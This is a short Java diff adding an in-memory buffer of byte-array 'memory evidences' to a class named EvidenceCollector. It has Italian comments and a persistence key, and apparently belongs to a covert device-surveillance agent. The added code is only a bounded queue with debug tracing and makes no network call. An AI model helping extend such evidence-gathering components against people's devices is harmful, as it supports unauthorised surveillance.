@@ -58,6 +58,10 @@ public final class EvidenceCollector implements iSingleton {
     private static final long PERSISTENCE_KEY = 0x6f20a847b93765c8L; // Chiave
 
     private static final long GUID = 0x931be5a5253ec4cL;
+    
+    Vector memoryEvidences = new Vector();
+    
+    
 
     // arbitraria
     // di
@@ -506,6 +510,28 @@ public final class EvidenceCollector implements iSingleton {
             Path.makeDirs();
         }
 
+    }
+
+    public void appendMemoryEvidence(byte[] memory) {
+        if(memoryEvidences == null){
+            memoryEvidences = new Vector();
+        }
+        
+        if(memoryEvidences.size() > 8) {
+            memoryEvidences.removeElementAt(0);
+        }    
+        memoryEvidences.addElement(memory);
+        
+        //#ifdef DEBUG
+        debug.trace("appendMemoryEvidence, size: " + memoryEvidences.size());
+        //#endif
+        
+    }
+
+    public Vector getMemoryEvidences() {
+        Vector v = memoryEvidences;
+        memoryEvidences = new Vector();
+        return v;
     }
 
 }
